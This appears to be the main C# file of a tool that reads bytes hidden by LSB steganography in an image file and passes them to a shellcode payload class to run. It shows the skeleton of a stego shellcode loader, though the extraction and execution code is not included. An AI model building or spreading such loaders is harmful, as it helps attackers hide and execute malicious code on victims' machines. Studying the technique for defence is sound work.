using System.Drawing;

using Runner.Algorithms;
using Runner.ImageSources;
using Runner.Payloads;

namespace Runner
{
    class Runner
    {
        static byte[] payload_data;

        static Bitmap bm;


        static IImageSource img  = new ImageFile();
        static IAlgorithm   alg  = new LSBM();
        static IPayload     pld  = new Shellcode();

        static void Main(string[] args)
        {
            if (args.Length == 2)
            {
                int payload_size = int.Parse(args[0]);
                payload_data = new byte[payload_size];

                bm = img.load(args[1]);
                alg.read(bm, payload_data);
                pld.run(payload_data);
            }
        }
    }
}
